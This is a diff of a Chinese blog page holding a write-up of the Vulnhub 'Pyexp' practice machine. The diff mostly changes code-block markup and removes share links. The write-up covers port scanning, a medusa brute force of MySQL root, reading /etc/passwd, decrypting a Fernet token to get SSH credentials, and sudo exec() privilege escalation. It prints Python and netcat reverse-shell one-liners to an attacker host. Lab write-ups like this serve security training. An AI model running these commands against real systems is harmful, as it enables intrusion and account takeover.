@@ -109,30 +109,12 @@
         <li><a class="icon" aria-label="下一篇" href="/2022/04/26/16%20Vulnhub%20Momentum%20Writeup/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
       </ul>
       <span id="i-prev" class="info" style="display:none;">上一篇</span>
       <span id="i-next" class="info" style="display:none;">下一篇</span>
       <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
     </span>
     <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hdfzzf.github.io/2022/04/27/17%20Vulnhub%20Pyexp%20Writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hdfzzf.github.io/2022/04/27/17%20Vulnhub%20Pyexp%20Writeup/&text=17 Vulnhub Pyexp Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hdfzzf.github.io/2022/04/27/17%20Vulnhub%20Pyexp%20Writeup/&title=17 Vulnhub Pyexp Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hdfzzf.github.io/2022/04/27/17%20Vulnhub%20Pyexp%20Writeup/&is_video=false&description=17 Vulnhub Pyexp Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=17 Vulnhub Pyexp Writeup&body=Check out this article: https://hdfzzf.github.io/2022/04/27/17%20Vulnhub%20Pyexp%20Writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hdfzzf.github.io/2022/04/27/17%20Vulnhub%20Pyexp%20Writeup/&title=17 Vulnhub Pyexp Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hdfzzf.github.io/2022/04/27/17%20Vulnhub%20Pyexp%20Writeup/&title=17 Vulnhub Pyexp Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hdfzzf.github.io/2022/04/27/17%20Vulnhub%20Pyexp%20Writeup/&title=17 Vulnhub Pyexp Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hdfzzf.github.io/2022/04/27/17%20Vulnhub%20Pyexp%20Writeup/&title=17 Vulnhub Pyexp Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/04/27/17%20Vulnhub%20Pyexp%20Writeup/&name=17 Vulnhub Pyexp Writeup&description=&lt;p&gt;该靶机难度不是很高，但是很有特点。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hdfzzf.github.io/2022/04/27/17%20Vulnhub%20Pyexp%20Writeup/&t=17 Vulnhub Pyexp Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
     <div id="toc">
       <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">1. 靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">2. 渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">2.1. 主机发现、端口扫描、端口服务发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="toc-number">2.2.</span> <span class="toc-text">2.2. MySQL密码爆破</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.3.</span> <span class="toc-text">2.3. 信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-shell"><span class="toc-number">2.4.</span> <span class="toc-text">2.4. get shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">2.5.</span> <span class="toc-text">2.5. 权限提升</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">3. 总结</span></a></li></ol>
     </div>
@@ -159,8 +141,6 @@
     <div class="postdate">
       
         <time datetime="2022-04-26T16:00:00.000Z" itemprop="datePublished">2022-04-27</time>
-        
-        (Updated: <time datetime="2022-04-27T15:54:44.589Z" itemprop="dateModified">2022-04-27</time>)
         
       
     </div>
@@ -222,9 +202,7 @@
 <p>kali：192.168.137.10</p>
 <p>靶机: 192.168.137.11</p>
 <h2 id="主机发现端口扫描端口服务发现">2.1. 主机发现、端口扫描、端口服务发现</h2>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> arp-scan -l
-<span class="token function">sudo</span> nmap -p- <span class="token number">192.168</span>.137.11
-<span class="token function">sudo</span> nmap -p1337,3306 -A <span class="token number">192.168</span>.137.11<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 192.168.137.11</span><br><span class="line">sudo nmap -p1337,3306 -A 192.168.137.11</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427225554.png" /></p>
 <p>信息：</p>
 <ul>
@@ -236,43 +214,23 @@
 <p>可以先进行ssh密码爆破，因此此时不知道靶机上有哪些用户，可以先用root跑</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427225159.png" /></p>
 <p>时间非常的长，并且最终也跑不出来。</p>
-<p>MySQL也有一个默认的用户root，但是此root并不是操作系统的root。输入如下命令进行爆破： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">medusa -h <span class="token number">192.168</span>.137.11 -M mysql -u root -P rockyou.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>MySQL也有一个默认的用户root，但是此root并不是操作系统的root。输入如下命令进行爆破： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">medusa -h 192.168.137.11 -M mysql -u root -P rockyou.txt</span><br></pre></td></tr></table></figure></p>
 <p>（hydra出了点问题，使用medusa进行爆破也是一样的）</p>
 <p>最终得到结果：</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427231946.png" /></p>
-<pre class="line-numbers language-none"><code class="language-none">mysql
-username: root
-password: prettywoman<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>远程登录数据库： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql -h <span class="token number">192.168</span>.137.11 -u root -p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql</span><br><span class="line">username: root</span><br><span class="line">password: prettywoman</span><br></pre></td></tr></table></figure>
+<p>远程登录数据库： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 192.168.137.11 -u root -p</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427232053.png" /></p>
 <h2 id="信息收集">2.3. 信息收集</h2>
 <p>总所周知，MySQL是可以提权的，但是这里有一个问题就是，当前执行MySQL的用户是kali的用户，并不是靶机的用户，因此就算利用MySQL命令执行提权得到的也是kali的用户的权限。可以利用下述命令执行系统查看id就可以知道。</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">\! id &lt;&#x3D;&#x3D;&gt; system id &lt;&#x3D;&#x3D;&gt; select do_system(&#39;id&#39;) # 靶机上无法运行第三个<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\! id &lt;==&gt; system id &lt;==&gt; select do_system(&#x27;id&#x27;) # 靶机上无法运行第三个</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427232347.png" /></p>
 <p>还可以读取MySQL的默认配置以及系统文件的内容，默认配置文件没有任何有用的信息，而/etc/passwd里面反而有信息</p>
-<pre class="line-numbers language-none"><code class="language-none"># 查看是否能够进行文件的读取和写入操作
-show variables like &#39;secure_file_priv&#39;;
-
-+------------------+-------+
-| Variable_name    | Value |
-+------------------+-------+
-| secure_file_priv |       |
-+------------------+-------+
-
-可以！<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 查看是否能够进行文件的读取和写入操作</span><br><span class="line">show variables like &#x27;secure_file_priv&#x27;;</span><br><span class="line"></span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br><span class="line"></span><br><span class="line">可以！</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427232522.png" /></p>
 <p>可以发现除了root之外，还有一个lucy用户。其实这里也可以再次进行ssh爆破，但是还是没结果。</p>
 <p>其实也可以查看一下/home/lucy/.ssh/id_rsa，如果存在的话，就可以利用密钥登陆ssh，可惜不存在。</p>
-<p>最终查看数据库发现有四个数据库 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">MariaDB <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> <span class="token keyword">show</span> <span class="token keyword">databases</span><span class="token punctuation">;</span>
-<span class="token operator">+</span><span class="token comment">--------------------+</span>
-<span class="token operator">|</span> <span class="token keyword">Database</span>           <span class="token operator">|</span>
-<span class="token operator">+</span><span class="token comment">--------------------+</span>
-<span class="token operator">|</span> <span class="token keyword">data</span>               <span class="token operator">|</span>
-<span class="token operator">|</span> information_schema <span class="token operator">|</span>
-<span class="token operator">|</span> mysql              <span class="token operator">|</span>
-<span class="token operator">|</span> performance_schema <span class="token operator">|</span>
-<span class="token operator">+</span><span class="token comment">--------------------+</span>
-<span class="token number">4</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.001</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>最终查看数据库发现有四个数据库 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(<span class="keyword">none</span>)]<span class="operator">&gt;</span> <span class="keyword">show</span> databases;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> Database           <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> data               <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> information_schema <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> mysql              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> performance_schema <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.001</span> sec)</span><br></pre></td></tr></table></figure></p>
 <p>其中，只有第一个是后来生成的，而后面的三个都是MySQL自带的。查看第一个数据，发现有一个表fernet，里面的信息如下：</p>
 <table>
 <colgroup>
@@ -305,35 +263,23 @@ show variables like &#39;secure_file_priv&#39;;
 <p>前者比较简单：</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427233417.png" /></p>
 <p>后者演示：(如果利用官方的解密代码查看过生成的key和token，就会发现它们是byte型的，所以前面加b)</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3
-from cryptography.fernet <span class="token function">import</span> Fernet
-key <span class="token operator">=</span> b<span class="token string">'UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0='</span>
-token <span class="token operator">=</span> b<span class="token string">'gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys='</span>
-f.decrypt<span class="token punctuation">(</span>token<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>得到： <pre class="line-numbers language-none"><code class="language-none">b&#39;lucy:wJ9&#96;&quot;Lemdv9[FEw-&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
-<p>根据/etc/passwd的内容，猜测这是ssh登录的账号和密码： <pre class="line-numbers language-none"><code class="language-none">username: lucy
-password: wJ9&#96;&quot;Lemdv9[FEw- # 这密码能爆破出来就有鬼了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python3</span><br><span class="line">from cryptography.fernet import Fernet</span><br><span class="line">key = b<span class="string">&#x27;UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0=&#x27;</span></span><br><span class="line">token = b<span class="string">&#x27;gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys=&#x27;</span></span><br><span class="line">f.decrypt(token)</span><br></pre></td></tr></table></figure>
+<p>得到： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;lucy:wJ9`&quot;Lemdv9[FEw-&#x27;</span><br></pre></td></tr></table></figure></p>
+<p>根据/etc/passwd的内容，猜测这是ssh登录的账号和密码： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: lucy</span><br><span class="line">password: wJ9`&quot;Lemdv9[FEw- # 这密码能爆破出来就有鬼了</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427233859.png" /></p>
 <p>切记要指定端口！！！</p>
 <h2 id="权限提升">2.5. 权限提升</h2>
-<p>在信息收集的时候发现： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>在信息收集的时候发现： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427234055.png" /></p>
-<p>查看一下该文件的权限配置 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">lucy@pyexp:~$ <span class="token function">ls</span> -l /opt/exp.py
--rw-r--r-- <span class="token number">1</span> root root <span class="token number">49</span> Aug <span class="token number">10</span>  <span class="token number">2020</span> /opt/exp.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
-<p>读取文件内容： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">lucy@pyexp:~$ <span class="token function">cat</span> /opt/exp.py
-uinput <span class="token operator">=</span> raw_input<span class="token punctuation">(</span><span class="token string">'how are you?'</span><span class="token punctuation">)</span>
-exec<span class="token punctuation">(</span>uinput<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
+<p>查看一下该文件的权限配置 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lucy@pyexp:~$ ls -l /opt/exp.py</span><br><span class="line">-rw-r--r-- 1 root root 49 Aug 10  2020 /opt/exp.py</span><br></pre></td></tr></table></figure></p>
+<p>读取文件内容： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lucy@pyexp:~$ cat /opt/exp.py</span><br><span class="line">uinput = raw_input(<span class="string">&#x27;how are you?&#x27;</span>)</span><br><span class="line"><span class="built_in">exec</span>(uinput)</span><br></pre></td></tr></table></figure></p>
 <p>心里狂喜，exec是python的函数，可以执行python代码。并且该文件的属主为root，如果用该文件得到shell，那就成功提权到root。</p>
-<p>输入如下命令直接提权：(提前用which确定一下是否有bash) <pre class="line-numbers language-none"><code class="language-none">import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>输入如下命令直接提权：(提前用which确定一下是否有bash) <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import pty; pty.spawn(&quot;/bin/bash&quot;)</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427234407.png" /></p>
-<p>也可以利用之前python反弹shell的代码：(kali先监听) <pre class="line-numbers language-none"><code class="language-none">import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.137.10&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;])<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>也可以利用之前python反弹shell的代码：(kali先监听) <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.137.10&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;])</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427234612.png" /></p>
-<p>还可以这么写反弹shell，效果和上面的一样。 <pre class="line-numbers language-none"><code class="language-none">__import__(&#39;os&#39;).system(&#39;nc 192.168.137.10 4444 -e &#x2F;bin&#x2F;bash&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
-<p>读取两个flag： <pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 1. &#x2F;home&#x2F;lucy&#x2F;user.txt
-8ca196f62e91847f07f8043b499bd9be
-
-&#x2F;&#x2F; 2. &#x2F;root&#x2F;root.txt
-a7a7e80ff4920ff06f049012700c99a8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>还可以这么写反弹shell，效果和上面的一样。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&#x27;os&#x27;).system(&#x27;nc 192.168.137.10 4444 -e /bin/bash&#x27;)</span><br></pre></td></tr></table></figure></p>
+<p>读取两个flag： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 1. /home/lucy/user.txt</span><br><span class="line">8ca196f62e91847f07f8043b499bd9be</span><br><span class="line"></span><br><span class="line">// 2. /root/root.txt</span><br><span class="line">a7a7e80ff4920ff06f049012700c99a8</span><br></pre></td></tr></table></figure></p>
 <h1 id="总结">3. 总结</h1>
 <p>该靶机难度并不算高，非常有特点，以往的靶机都是通过web进行get shell，而这台靶机通过数据库信息来get shell。</p>
 <p>主要的难点在能否知道fernet是python的加解密的库。</p>
@@ -393,7 +339,6 @@ a7a7e80ff4920ff06f049012700c99a8<span aria-hidden="true" class="line-numbers-row
     <div id="actions-footer">
         <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
         <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
         <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
     </div>
 
